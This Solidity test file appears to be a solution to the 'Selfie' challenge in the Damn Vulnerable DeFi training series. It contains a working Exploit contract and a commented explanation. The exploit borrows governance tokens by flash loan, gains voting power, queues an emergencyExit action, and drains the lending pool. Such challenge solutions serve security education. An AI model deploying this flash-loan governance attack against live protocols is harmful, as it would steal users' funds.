// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(address(pool), address(governance), address(token));
        exploiter.exploitSetup(address(recovery));
        vm.warp(block.timestamp + 2 days);
        exploiter.exploitCloseup();
        /* Summary: 
        * - uses a flash loan to temporarily gain governance voting power
        * - proposes a malicious governance action during the flash loan callback
        * - executes that action after the required time delay to steal all the funds from the SelfiePool.
        */
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Exploit is IERC3156FlashBorrower {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint256 actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _selfiePool, address _simpleGovernance, address _token) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        // It delegates all the voting power of the borrowed tokens to the Exploit contract itself.
        // Since the flash loan amount is large, the Exploit contract now temporarily has enough votes.
        damnValuableToken.delegate(address(this));
        // queues a governance action in SimpleGovernance
        uint256 _actionId = simpleGovernance.queueAction(address(selfiePool), 0, data);
        actionId = _actionId;
        IERC20(token).approve(address(selfiePool), amount + fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external returns (bool) {
        // Sets the amount to flash loan (enough to get voting power). This amount doesn't necessarily have to be the full pool amount, just enough to gain majority voting power.
        uint256 amountRequired = 1_500_000e18;
        // Creates the calldata to call the emergencyExit(recovery) function on SelfiePool, sending the drained tokens to the recovery address.
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        // Initiates the flash loan from SelfiePool to the Exploit contract.
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, data);
    }

    // Executes the queued governance action after the 2-day delay.
    function exploitCloseup() external returns (bool) {
        // Executes the governance action using the actionId obtained in onFlashLoan. This triggers the emergencyExit function on SelfiePool, draining the pool.
        bytes memory resultData = simpleGovernance.executeAction(actionId);
    }
}

/**
 * The vulnerability lies in the combination of the flash loan mechanism and the governance process. Here's the breakdown:
 *
 * Governance Control Weakness: The emergencyExit function in SelfiePool is protected by the onlyGovernance modifier, meaning only the SimpleGovernance contract can call it. However, the governance itself can be manipulated.
 *
 * Voting Power via Flash Loan: To propose a governance action, an attacker needs to have more than half of the voting token supply delegated to them. The attacker can use a flash loan from the SelfiePool itself to borrow a large amount of DVT tokens temporarily.
 *
 * Delegate Voting Power During Flash Loan: Within the flash loan callback (onFlashLoan in the Exploit contract), the attacker can delegate the voting power of the borrowed tokens to their own contract (Exploit). Because they temporarily hold a large amount of tokens, they gain sufficient voting power.
 *
 * Queue Malicious Action: While having this temporary voting power, the attacker can queue a governance action in SimpleGovernance to call the emergencyExit function on the SelfiePool. This action is designed to drain all the tokens from the pool and send them to the recovery address.
 *
 * Action Delay and Execution: The governance system has a 2-day action delay. After this delay, anyone (including the attacker) can execute the queued action. By this time, the attacker has already repaid the flash loan, but the governance action remains queued.
 *
 * Drain the Pool: Once executed, the governance action calls emergencyExit on SelfiePool, and because the action was correctly queued and executed by the governance system, the onlyGovernance modifier passes, and the tokens are drained.
 *
 * Summary:
 * - uses a flash loan to temporarily gain governance voting power
 * - proposes a malicious governance action during the flash loan callback
 * - executes that action after the required time delay to steal all the funds from the SelfiePool.
 */
